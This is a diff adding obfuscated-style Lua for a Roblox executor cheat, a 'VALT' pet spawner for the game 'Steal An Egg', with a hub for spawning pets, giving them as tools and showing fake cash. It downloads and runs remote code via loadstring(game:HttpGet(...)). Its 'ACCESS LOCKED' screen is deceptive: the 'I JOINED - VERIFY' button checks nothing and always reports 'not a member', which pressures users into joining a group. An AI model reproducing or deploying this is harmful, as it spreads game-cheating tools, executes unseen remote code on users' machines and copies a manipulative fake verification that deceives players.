+    local ScreenGui = Instance.new("ScreenGui")
+
+    ScreenGui.Name = "ValtGate"
+    ScreenGui.IgnoreGuiInset = true
+    ScreenGui.ResetOnSpawn = false
+    ScreenGui.DisplayOrder = 2147483647
+    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    v9(ScreenGui)
+    t2.value14.gui = ScreenGui
+
+    local TextButton = Instance.new("TextButton")
+
+    TextButton.Name = "Shield"
+    TextButton.Size = UDim2.fromScale(1, 1)
+    TextButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    TextButton.BackgroundTransparency = 0.55
+    TextButton.BorderSizePixel = 0
+    TextButton.AutoButtonColor = false
+    TextButton.Active = true
+    TextButton.Modal = true
+    TextButton.Text = ""
+    TextButton.ZIndex = 40
+    TextButton.Parent = ScreenGui
+    t2.value14.shield = TextButton
+
+    local value6 = t2.value6
+
+    if value6 then
+        value6 = t2.value6.ViewportSize
+    end
+
+    if not value6 then
+        value6 = Vector2.new(1280, 720)
+    end
+
+    local v229 = math.clamp(math.floor(value6.X * 0.9), 240, 330)
+    local Frame = Instance.new("Frame")
+
+    Frame.AnchorPoint = Vector2.new(0.5, 0.5)
+    Frame.Position = UDim2.fromScale(0.5, 0.5)
+    Frame.Size = UDim2.fromOffset(v229, 186)
+    Frame.BackgroundColor3 = Color3.fromRGB(18, 18, 20)
+    Frame.BorderSizePixel = 0
+    Frame.ZIndex = 50
+    Frame.Parent = ScreenGui
+    Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 12)
+
+    local UIStroke = Instance.new("UIStroke", Frame)
+
+    UIStroke.Color = Color3.fromRGB(255, 190, 60)
+    UIStroke.Thickness = 1.5
+    UIStroke.Transparency = 0.35
+
+    local ImageLabel = Instance.new("ImageLabel")
+
+    ImageLabel.BackgroundTransparency = 1
+    ImageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+    ImageLabel.Position = UDim2.fromScale(0.5, 0.5)
+    ImageLabel.Size = UDim2.new(1, 60, 1, 60)
+    ImageLabel.ZIndex = 49
+    ImageLabel.Image = "rbxassetid://6014261993"
+    ImageLabel.ImageColor3 = Color3.new(0, 0, 0)
+    ImageLabel.ImageTransparency = 0.45
+    ImageLabel.ScaleType = Enum.ScaleType.Slice
+    ImageLabel.SliceCenter = Rect.new(49, 49, 450, 450)
+    ImageLabel.Parent = Frame
+
+    local Frame2 = Instance.new("Frame")
+
+    Frame2.Size = UDim2.new(1, 0, 0, 3)
+    Frame2.BorderSizePixel = 0
+    Frame2.BackgroundColor3 = Color3.fromRGB(255, 190, 60)
+    Frame2.ZIndex = 51
+    Frame2.Parent = Frame
+    Instance.new("UICorner", Frame2).CornerRadius = UDim.new(0, 3)
+
+    local TextLabel = Instance.new("TextLabel")
+
+    TextLabel.BackgroundTransparency = 1
+    TextLabel.Position = UDim2.fromOffset(0, 16)
+    TextLabel.Size = UDim2.new(1, 0, 0, 24)
+    TextLabel.Font = Enum.Font.GothamBold
+    TextLabel.TextSize = 17
+    TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    TextLabel.Text = "ACCESS LOCKED"
+    TextLabel.ZIndex = 51
+    TextLabel.Parent = Frame
+
+    local TextLabel3 = Instance.new("TextLabel")
+
+    TextLabel3.BackgroundTransparency = 1
+    TextLabel3.Position = UDim2.fromOffset(20, 42)
+    TextLabel3.Size = UDim2.new(1, -40, 0, 36)
+    TextLabel3.Font = Enum.Font.GothamMedium
+    TextLabel3.TextSize = 12
+    TextLabel3.TextWrapped = true
+    TextLabel3.TextColor3 = Color3.fromRGB(190, 190, 196)
+    TextLabel3.Text = "To use this script you must join " .. t2.value8.GROUP_NAME .. ". Copy the link, join, then verify."
+    TextLabel3.ZIndex = 51
+    TextLabel3.Parent = Frame
+
+    local function v236(p26, p27, p28, p29, p30)
+        local TextButton2 = Instance.new("TextButton")
+
+        TextButton2.Position = UDim2.new(p27, 0, 0, 84)
+        TextButton2.Size = UDim2.new(p28, 0, 0, 38)
+        TextButton2.BackgroundColor3 = p29
+        TextButton2.BorderSizePixel = 0
+        TextButton2.AutoButtonColor = true
+        TextButton2.Font = Enum.Font.GothamBold
+        TextButton2.TextSize = 12
+        TextButton2.TextScaled = false
+        TextButton2.TextColor3 = p30
+        TextButton2.Text = p26
+        TextButton2.ZIndex = 51
+        TextButton2.Parent = Frame
+        Instance.new("UICorner", TextButton2).CornerRadius = UDim.new(0, 8)
+
+        return TextButton2
+    end
+
+    local v237 = v236("COPY GROUP LINK", 0.06, 0.46, Color3.fromRGB(255, 190, 60), Color3.fromRGB(20, 20, 20))
+    local v238 = v236("I JOINED - VERIFY", 0.54, 0.4, Color3.fromRGB(40, 40, 46), Color3.fromRGB(255, 255, 255))
+    local TextLabel4 = Instance.new("TextLabel")
+
+    TextLabel4.BackgroundTransparency = 1
+    TextLabel4.Position = UDim2.fromOffset(16, 132)
+    TextLabel4.Size = UDim2.new(1, -32, 0, 34)
+    TextLabel4.Font = Enum.Font.GothamMedium
+    TextLabel4.TextSize = 11
+    TextLabel4.TextWrapped = true
+    TextLabel4.TextColor3 = Color3.fromRGB(150, 150, 158)
+    TextLabel4.Text = "waiting on you, chef"
+    TextLabel4.ZIndex = 51
+    TextLabel4.Parent = Frame
+
+    function t2.value14.dismiss()
+        pcall(function()
+            ScreenGui:Destroy()
+        end)
+
+        local value14 = t2.value14
+        local value14_2 = t2.value14
+
+        value14.gui = nil
+        value14_2.shield = nil
+    end
+
+    t2.value18(v237.MouseButton1Click:Connect(function()
+        local v332 = t2.value19(t2.value8.GROUP_LINK)
+        local v333 = v332
+        local v334 = TextLabel4
+
+        if v332 then
+            v333 = "link copied - paste it in your browser and join the group"
+        end
+
+        v334.Text = v333 or "your executor has no clipboard function - copy failed"
+
+        local v335 = TextLabel4
+
+        if v332 then
+            v332 = Color3.fromRGB(110, 220, 140)
+        end
+
+        if not v332 then
+            v332 = Color3.fromRGB(255, 190, 60)
+        end
+
+        v335.TextColor3 = v332
+    end))
+
+    local n1 = 0
+
+    t2.value18(v238.MouseButton1Click:Connect(function()
+        n1 += 1
+        v238.Text = "CHECKING..."
+        TextLabel4.Text = "querying group membership..."
+        TextLabel4.TextColor3 = Color3.fromRGB(150, 150, 158)
+        task.delay(1.1, function()
+            if not t2.value14.gui then
+                return
+            end
+
+            v238.Text = "I JOINED - VERIFY"
+
+            local v401 = TextLabel4
+            local v402 = n1 > 2
+
+            if v402 then
+                v402 = "still not a member. join " .. t2.value8.GROUP_NAME .. " with the link above."
+            end
+
+            if not v402 then
+                v402 = "not a member - join with the link above, then try again"
+            end
+
+            v401.Text = v402
+            TextLabel4.TextColor3 = Color3.fromRGB(255, 140, 140)
+        end)
+    end))
+
+    return ScreenGui
+end
+t2.value45 = nil
+local value6 = t2.value6
+if value6 then
+    value6 = t2.value6.ViewportSize
+end
+t1.value24 = value6
+if not value6 then
+    t1.value24 = Vector2.new(1280, 720)
+end
+if t2.value7 then
+    t2.value45 = UDim2.fromOffset(math.clamp(math.floor(t1.value24.X * 0.92), 300, 560), (math.clamp(math.floor(t1.value24.Y * 0.82), 260, 420)))
+else
+    t2.value45 = UDim2.fromOffset(620, 480)
+end
+function t2.value46()
+    t2.value10 = false
+
+    for _, v in ipairs(t2.value11) do
+        local v243 = v
+
+        pcall(function()
+            v243:Disconnect()
+        end)
+    end
+
+    table.clear(t2.value11)
+    t2.value36()
+    t2.value38()
+    v40()
+
+    if t2.value14.gui then
+        pcall(function()
+            t2.value14.gui:Destroy()
+        end)
+    end
+
+    if t2.value15.window then
+        pcall(function()
+            t2.value15.window:Destroy()
+        end)
+    end
+
+    getgenv().__VALT_SPAWNER = nil
+    warn("[VALT SPAWNER] unloaded")
+end
+function t1.value24()
+    local ok, result = pcall(function()
+        return loadstring(game:HttpGet(t2.value9))()
+    end)
+    local v246 = result
+
+    if not ok or not v246 then
+        warn("[VALT SPAWNER] WindUI failed to load: " .. tostring(v246))
+
+        return
+    end
+
+    local v247 = v246
+    local v248 = "Steal An Egg  |  " .. #t2.value20 .. " assets"
+    local value45 = t2.value45
+    local CreateWindow = v247.CreateWindow
+    local t5 = {
+		Enabled = false
+	}
+    local v252 = CreateWindow(v247, {
+		Title = "VALT :: Pet Spawner",
+		Icon = "egg",
+		Author = v248,
+		Folder = "ValtSpawner",
+		Size = value45,
+		Transparent = true,
+		Theme = "Dark",
+		SideBarWidth = 165,
+		HideSearchBar = false,
+		OpenButton = t5
+	})
+
+    t2.value15.window = v252
+
+    if getgenv().__VALT_SPAWNER then
+        getgenv().__VALT_SPAWNER.window = v252
+    end
+
+    local v253 = v252:Tab({
+		Title = "Pets",
+		Icon = "paw-print"
+	})
+    local v254 = v252:Tab({
+		Title = "Preview",
+		Icon = "eye"
+	})
+    local v255 = v252:Tab({
+		Title = "Options",
+		Icon = "settings"
+	})
+
+    t2.value15.gridTab = v253
+    v253:Input({
+		Title = "Search",
+		Placeholder = "pet name...",
+		Callback = function(p31)
+        local value16 = t2.value16
+        local lower = string.lower
+        local _tostring = tostring
+
+        if not p31 then
+            p31 = ""
+        end
+
+        value16.text = lower((_tostring(p31)))
+        t2.value15.rebuild()
+    end
+	})
+
+    local value21 = t2.value21
+
+    v253:Dropdown({
+		Title = "Rarity",
+		Values = value21,
+		Value = "All",
+		Callback = function(p32)
+        t2.value16.rarity = tostring(p32)
+        t2.value15.rebuild()
+    end
+	})
+
+    local value15 = t2.value15
+    local v258 = v253
+    local Paragraph = v258.Paragraph
+    local v260 = #t2.value20
+
+    value15.counter = Paragraph(v258, {
+		Title = "Loaded",
+		Desc = v260 .. " assets ready - click a card to spawn"
+	})
+    v253:Divider()
+
+    local function v261()
+        for _, v in ipairs(t2.value15.rows) do
+            local ElementFrame = v.ElementFrame
+
+            if typeof(ElementFrame) == "Instance" then
+                pcall(function()
+                    ElementFrame:Destroy()
+                end)
+            end
+        end
+
+        table.clear(t2.value15.rows)
+    end
+
+    local n2 = 0
+
+    function t2.value15.rebuild()
+        n2 += 1
+
+        local v344 = n2
+
+        v261()
+
+        local t6 = {}
+
+        for _, v in ipairs(t2.value20) do
+            local v348 = t2.value16.text == ""
+
+            if not v348 then
+                v348 = string.find(string.lower(v.name), t2.value16.text, 1, true) ~= nil
+            end
+
+            local v349 = t2.value16.rarity == "All"
+
+            if not v349 then
+                v349 = v.rarity == t2.value16.rarity
+            end
+
+            if v348 and v349 then
+                t6[#t6 + 1] = v
+            end
+        end
+
+        if t2.value15.counter then
+            pcall(function()
+                t2.value15.counter:SetDesc(#t6 .. " of " .. #t2.value20 .. " assets shown - click a card to spawn")
+            end)
+        end
+
+        task.spawn(function()
+            local v403
+            local n3 = 0
+            for i, v in ipairs(t6) do
+                local v407 = v
+
+                if v344 ~= n2 or not t2.value10 then
+                    return
+                end
+
+                if n3 == 0 then
+                    v403 = v253:HStack({})
+                    t2.value15.rows[#t2.value15.rows + 1] = v403
+                end
+
+                local name = v407.name
+                local format = string.format
+                local Button = v403.Button
+                local v411 = format("%s  |  $%s/s", v407.rarity, t2.value23(v407.rate))
+                local v412 = Button(v403, {
+					Title = name,
+					Desc = v411,
+					Callback = function()
+                    t2.value17 = v407
+                    if t2.value8.GIVE_TOOL then
+                        local v422, v423 = t2.value37(v407)
+                        local v424 = v246
+                        local v425 = v422
+                        if v422 then
+                            v425 = v407.name .. " -> backpack"
+                        end
+                        if not v425 then
+                            v425 = "tool failed"
+                        end
+                        local v426 = v422 and "equip it, then click to place the pet"
+                        if not v426 then
+                            v426 = tostring(v423)
+                        end
+                        local v427 = v422 and 2 or 4
+                        local v428 = v422 and "backpack"
+                        if not v428 then
+                            v428 = "circle-alert"
+                        end
+                        v424:Notify({
+								Title = v425,
+								Content = v426,
+								Duration = v427,
+								Icon = v428
+							})
+
+                        return
+                    end
+                    local v430, v431 = t2.value35(v407)
+                    local v432 = v246
+                    local v433 = v430
+                    if v430 then
+                        v433 = v407.name .. " spawned"
+                    end
+                    if not v433 then
+                        v433 = "spawn failed"
+                    end
+                    local v434 = v430
+                    if v430 then
+                        v434 = v407.rarity .. "  |  " .. #t2.value12 .. "/" .. t2.value8.MAX_SPAWNS .. " active"
+                    end
+                    if not v434 then
+                        v434 = tostring(v431)
+                    end
+                    local v435 = v430 and 2 or 4
+                    if v430 then
+                        v430 = "sparkles"
+                    end
+                    if not v430 then
+                        v430 = "circle-alert"
+                    end
+                    v432:Notify({
+							Title = v433,
+							Content = v434,
+							Duration = v435,
+							Icon = v430
+						})
+                end
+				})
+
+                if v407.icon ~= "" then
+                    pcall(function()
+                        v412:SetThumbnail(v407.icon)
+                    end)
+                end
+
+                n3 += 1
+
+                if n3 >= t2.value8.GRID_COLUMNS then
+                    n3 = 0
+
+                    if i % (t2.value8.GRID_COLUMNS * 4) == 0 then
+                        task.wait()
+                    end
+                end
+            end
+        end)
+    end
+
+    v254:Section({
+		Title = "Model viewer"
+	})
+
+    local t7 = {}
+
+    for _, v in ipairs(t2.value20) do
+        t7[#t7 + 1] = v.name
+    end
+
+    local function v266(p33)
+        local u351
+        local v352, v353, v354 = ipairs(t2.value20)
+        local g356
+        local v355
+        repeat
+            v354, v355 = v352(v353, v354)
+
+            if not v354 then
+                g356 = true
+            end
+
+            if g356 then
+                break
+            end
+        until p33 == v355.name
+        if not g356 then
+            u351 = v355
+        end
+        if not u351 then
+            return
+        end
+        t2.value17 = u351
+        local AssetModels = t2.value1:FindFirstChild("AssetModels")
+        if AssetModels then
+            AssetModels = AssetModels:FindFirstChild(u351.id)
+        end
+        local v358 = AssetModels
+        if not v358 then
+            local v359 = v246
+            local id = u351.id
+
+            v359:Notify({
+				Title = "no model",
+				Content = id,
+				Duration = 3,
+				Icon = "circle-alert"
+			})
+
+            return
+        end
+        if t2.value15.viewport then
+            pcall(function()
+                local viewport = t2.value15.viewport
+                local t8 = { v358:Clone() }
+
+                viewport:SetObject(v3(t8))
+            end)
+        end
+        if t2.value15.previewInfo then
+            pcall(function()
+                t2.value15.previewInfo:SetTitle(u351.name)
+                t2.value15.previewInfo:SetDesc(string.format("Rarity: %s   |   Earns: $%s/s   |   Base scale: %.2f", u351.rarity, t2.value23(u351.rate), u351.scale))
+
+                if u351.icon ~= "" then
+                    t2.value15.previewInfo:SetImage(u351.icon)
+                end
+            end)
+        end
+    end
+
+    local v267 = t7[1]
+
+    v254:Dropdown({
+		Title = "Pet",
+		Values = t7,
+		Value = v267,
+		Callback = v266
+	})
+    t2.value15.previewInfo = v254:Paragraph({
+		Title = "-",
+		Desc = "pick a pet",
+		Image = "",
+		ImageSize = 48
+	})
+
+    local AssetModels = t2.value1:FindFirstChild("AssetModels")
+
+    if AssetModels then
+        AssetModels = AssetModels:FindFirstChild(t2.value20[1].id)
+    end
+
+    local value15_2 = t2.value15
+    local v270 = AssetModels and AssetModels:Clone()
+
+    if not v270 then
+        v270 = Instance.new("Model")
+    end
+
+    value15_2.viewport = v254:Viewport({
+		Title = "Model",
+		Object = v270,
+		Height = 220,
+		Interactive = true
+	})
+    v254:Button({
+		Title = "Take into backpack",
+		Desc = "hands you the previewed pet as a tool",
+		Callback = function()
+        if not t2.value17 then
+            return
+        end
+
+        local v361, v362 = t2.value37(t2.value17)
+        local v363 = v246
+        local v364 = v361
+
+        if v361 then
+            v364 = t2.value17.name .. " -> backpack"
+        end
+
+        local v365 = v364 or "tool failed"
+        local v366 = v361
+
+        if v361 then
+            v366 = "equip it, then click to place the pet"
+        end
+
+        local v367 = v366 or tostring(v362)
+
+        if v361 then
+            v361 = "backpack"
+        end
+
+        if not v361 then
+            v361 = "circle-alert"
+        end
+
+        v363:Notify({
+				Title = v365,
+				Content = v367,
+				Duration = 3,
+				Icon = v361
+			})
+    end
+	})
+    v254:Button({
+		Title = "Spawn this one",
+		Desc = "drops the previewed pet in front of you",
+		Callback = function()
+        if not t2.value17 then
+            return
+        end
+
+        local v368, v369 = t2.value35(t2.value17)
+        local v370 = v246
+        local v371 = v368
+
+        if v368 then
+            v371 = t2.value17.name .. " spawned"
+        end
+
+        if not v371 then
+            v371 = "spawn failed"
+        end
+
+        local v372 = v368
+
+        if v368 then
+            v372 = #t2.value12 .. "/" .. t2.value8.MAX_SPAWNS .. " active"
+        end
+
+        if not v372 then
+            v372 = tostring(v369)
+        end
+
+        local v373 = v368 and "sparkles"
+
+        if not v373 then
+            v373 = "circle-alert"
+        end
+
+        v370:Notify({
+				Title = v371,
+				Content = v372,
+				Duration = 3,
+				Icon = v373
+			})
+    end
+	})
+    v255:Section({
+		Title = "Spawn behaviour"
+	})
+
+    local value8 = t2.value8
+    local Toggle = v255.Toggle
+    local GIVE_TOOL = value8.GIVE_TOOL
+
+    Toggle(v255, {
+		Title = "Give as backpack tool",
+		Desc = "on = card click hands you the pet, click again in-world to place it",
+		Value = GIVE_TOOL,
+		Callback = function(p34)
+        t2.value8.GIVE_TOOL = p34
+    end
+	})
+
+    local HAND_MAX_STUDS = t2.value8.HAND_MAX_STUDS
+    local t9 = {
+		Min = 2,
+		Max = 14,
+		Default = HAND_MAX_STUDS
+	}
+
+    v255:Slider({
+		Title = "Held pet size (studs)",
+		Step = 1,
+		Value = t9,
+		Callback = function(p35)
+        t2.value8.HAND_MAX_STUDS = tonumber(p35) or 4
+    end
+	})
+
+    local SCALE_MULT = t2.value8.SCALE_MULT
+    local t10 = {
+		Min = 0.2,
+		Max = 8,
+		Default = SCALE_MULT
+	}
+
+    v255:Slider({
+		Title = "Scale multiplier",
+		Step = 0.1,
+		Value = t10,
+		Callback = function(p36)
+        t2.value8.SCALE_MULT = tonumber(p36) or 1
+    end
+	})
+
+    local value8_2 = t2.value8
+    local Slider = v255.Slider
+    local SPAWN_DISTANCE = value8_2.SPAWN_DISTANCE
+    local t11 = {
+		Min = 4,
+		Max = 60,
+		Default = SPAWN_DISTANCE
+	}
+
+    Slider(v255, {
+		Title = "Spawn distance",
+		Step = 1,
+		Value = t11,
+		Callback = function(p37)
+        t2.value8.SPAWN_DISTANCE = tonumber(p37) or 12
+    end
+	})
+
+    local MAX_SPAWNS = t2.value8.MAX_SPAWNS
+    local t12 = {
+		Min = 1,
+		Max = 120,
+		Default = MAX_SPAWNS
+	}
+
+    v255:Slider({
+		Title = "Max active spawns",
+		Step = 1,
+		Value = t12,
+		Callback = function(p38)
+        t2.value8.MAX_SPAWNS = math.floor(tonumber(p38) or 40)
+        t2.value34()
+    end
+	})
+
+    local SPIN = t2.value8.SPIN
+
+    v255:Toggle({
+		Title = "Spin",
+		Value = SPIN,
+		Callback = function(p39)
+        t2.value8.SPIN = p39
+    end
+	})
+
+    local value8_3 = t2.value8
+    local Toggle2 = v255.Toggle
+    local FLOAT = value8_3.FLOAT
+
+    Toggle2(v255, {
+		Title = "Float",
+		Value = FLOAT,
+		Callback = function(p40)
+        t2.value8.FLOAT = p40
+    end
+	})
+
+    local Toggle3 = v255.Toggle
+    local OWN_PLOT_ONLY = t2.value8.OWN_PLOT_ONLY
+
+    Toggle3(v255, {
+		Title = "Place in my plot only",
+		Value = OWN_PLOT_ONLY,
+		Callback = function(p41)
+        t2.value8.OWN_PLOT_ONLY = p41
+    end
+	})
+
+    local value8_4 = t2.value8
+    local Toggle4 = v255.Toggle
+    local GROUND = value8_4.GROUND
+
+    Toggle4(v255, {
+		Title = "Sit on the ground",
+		Value = GROUND,
+		Callback = function(p42)
+        t2.value8.GROUND = p42
+    end
+	})
+
+    local ANIMATE = t2.value8.ANIMATE
+
+    v255:Toggle({
+		Title = "Play idle animation",
+		Value = ANIMATE,
+		Callback = function(p43)
+        t2.value8.ANIMATE = p43
+    end
+	})
+
+    local NAMETAG = t2.value8.NAMETAG
+
+    v255:Toggle({
+		Title = "Name tags",
+		Value = NAMETAG,
+		Callback = function(p44)
+        t2.value8.NAMETAG = p44
+    end
+	})
+
+    local value8_5 = t2.value8
+    local Toggle5 = v255.Toggle
+    local CASH_VISUAL = value8_5.CASH_VISUAL
+
+    Toggle5(v255, {
+		Title = "Count it on my cash",
+		Desc = "your own money label rises with the popups - visual only, the server never sees it",
+		Value = CASH_VISUAL,
+		Callback = function(p45)
+        t2.value8.CASH_VISUAL = p45
+
+        if not p45 then
+            v40()
+        end
+    end
+	})
+
+    local Toggle6 = v255.Toggle
+    local MONEY_POPUP = t2.value8.MONEY_POPUP
+
+    Toggle6(v255, {
+		Title = "Money popups",
+		Desc = "green +$X off every spawn, same as the game's own pets",
+		Value = MONEY_POPUP,
+		Callback = function(p46)
+        t2.value8.MONEY_POPUP = p46
+    end
+	})
+
+    local PAY_INTERVAL = t2.value8.PAY_INTERVAL
+    local t13 = {
+		Min = 0.5,
+		Max = 10,
+		Default = PAY_INTERVAL
+	}
+
+    v255:Slider({
+		Title = "Payout interval (s)",
+		Step = 0.5,
+		Value = t13,
+		Callback = function(p47)
+        t2.value8.PAY_INTERVAL = tonumber(p47) or 1
+    end
+	})
+
+    local value8_6 = t2.value8
+    local Toggle7 = v255.Toggle
+    local ANCHORED = value8_6.ANCHORED
+
+    Toggle7(v255, {
+		Title = "Anchored",
+		Desc = "off = the rig falls on its own joints",
+		Value = ANCHORED,
+		Callback = function(p48)
+        t2.value8.ANCHORED = p48
+    end
+	})
+    v255:Divider()
+    v255:Section({
+		Title = "Bulk"
+	})
+    v255:Button({
+		Title = "Spawn random",
+		Callback = function()
+        local v389 = t2.value20[math.random(1, #t2.value20)]
+
+        t2.value35(v389)
+        v246:Notify({
+				Title = v389.name,
+				Content = "random spawn",
+				Duration = 2,
+				Icon = "dices"
+			})
+    end
+	})
+    v255:Button({
+		Title = "Spawn every pet of the selected rarity",
+		Desc = "uses the rarity filter from the Pets tab",
+		Callback = function()
+        task.spawn(function()
+            local n4 = 0
+
+            for _, v in ipairs(t2.value20) do
+                local v418 = t2.value16.rarity == "All"
+
+                if not v418 then
+                    v418 = v.rarity == t2.value16.rarity
+                end
+
+                if v418 then
+                    if t2.value35(v) then
+                        n4 += 1
+                    end
+
+                    task.wait(0.05)
+                end
+            end
+
+            local v419 = v246
+            local v420 = n4 .. " spawned"
+
+            v419:Notify({
+					Title = "bulk spawn",
+					Content = v420,
+					Duration = 3,
+					Icon = "sparkles"
+				})
+        end)
+    end
+	})
+    v255:Button({
+		Title = "Clear all spawns",
+		Callback = function()
+        local v390 = #t2.value12
+
+        t2.value36()
+
+        local v391 = v246
+        local Notify = v391.Notify
+        local v393 = v390 .. " removed"
+
+        Notify(v391, {
+				Title = "cleared",
+				Content = v393,
+				Duration = 2,
+				Icon = "trash-2"
+			})
+    end
+	})
+    v255:Button({
+		Title = "Empty the backpack",
+		Desc = "removes every pet tool this script handed you",
+		Callback = function()
+        local v394 = #t2.value13
+
+        t2.value38()
+
+        local v395 = v246
+        local v396 = v394 .. " tools removed"
+
+        v395:Notify({
+				Title = "backpack cleared",
+				Content = v396,
+				Duration = 2,
+				Icon = "backpack"
+			})
+    end
+	})
+    v255:Divider()
+    v255:Section({
+		Title = "Script"
+	})
+
+    local Paragraph2 = v255.Paragraph
+    local GROUP_NAME = t2.value8.GROUP_NAME
+    local GROUP_LINK = t2.value8.GROUP_LINK
+
+    Paragraph2(v255, {
+		Title = "Group requirement",
+		Desc = "Access is gated on " .. GROUP_NAME .. " - " .. GROUP_LINK
+	})
+    v255:Button({
+		Title = "Copy group link",
+		Callback = function()
+        local v397 = t2.value19(t2.value8.GROUP_LINK)
+        local v398 = v246
+        local v399 = not v397 and "no clipboard function" or "copied"
+        local GROUP_LINK2 = t2.value8.GROUP_LINK
+
+        v398:Notify({
+				Title = v399,
+				Content = GROUP_LINK2,
+				Duration = 3,
+				Icon = "clipboard"
+			})
+    end
+	})
+    v255:Button({
+		Title = "Unload  (End)",
+		Desc = "kills every spawn, the hub and all connections",
+		Callback = function()
+        getgenv().__VALT_SPAWNER.unload()
+    end
+	})
+    t2.value15.rebuild()
+    v266(t7[1])
+    pcall(function()
+        v252:SelectTab(v253.Index)
+    end)
+
+    return v252
+end
+getgenv().__VALT_SPAWNER = {
+	unload = t2.value46,
+	CONFIG = t2.value8,
+	PETS = t2.value20,
+	spawn = t2.value35,
+	give = t2.value37,
+	tools = t2.value13,
+	clear = t2.value36
+}
+t2.value18(t1.value4.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then
+        return
+    end
+
+    if input.KeyCode == Enum.KeyCode.End then
+        t2.value46()
+    end
+end))
+t1.value24()
+task.defer(t1.value27)
+warn("[VALT SPAWNER] loaded - " .. #t2.value20 .. " assets indexed. Unload: End.")
